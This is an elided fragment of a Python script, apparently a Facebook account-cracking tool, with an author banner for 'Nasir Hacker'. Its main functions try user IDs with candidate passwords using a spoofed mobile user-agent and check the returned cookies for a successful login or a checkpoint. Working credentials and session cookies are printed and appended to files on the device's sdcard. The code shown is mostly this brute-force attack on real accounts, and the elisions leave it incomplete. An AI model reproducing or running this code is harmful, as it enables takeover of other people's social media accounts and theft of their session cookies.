...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[Nasir-khan')
...
\033[1;32m---------------------------------------------------------
\033[1;32m  AUTHOR    : Nasir Hacker😊 
\033[1;32m  GITHUB    : Nasir112
\033[1;32m  FACEBOOK  : Abdul Nasir
...
def menu():
	...
	if _____ALAMIN_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/profile.php?id=100075043421846&mibextid=ZbWKwL")
...
def rcerek(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mNasir-khan\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/Nasir-Random.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	    print('\033[1;91m[Nasir.CP]\033[1;93m[😪]\033[1;91m'+uid+' | '+ps+'\033[1;94m'+tahunng(uid))
              #  print ('\033[1;32m[‎😔]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/Nasir-Random-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[Nasir-khan]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def alamin(uid,pwv,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
        	    ...
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	    print('\033[1;91m[Nasir.CP]\033[1;93m[😪]\033[1;91m'+uid+' | '+ps+'\033[1;91m '+tahunng(uid))
              #  print ('\033[1;32m[😔]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/Nasir-Random-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
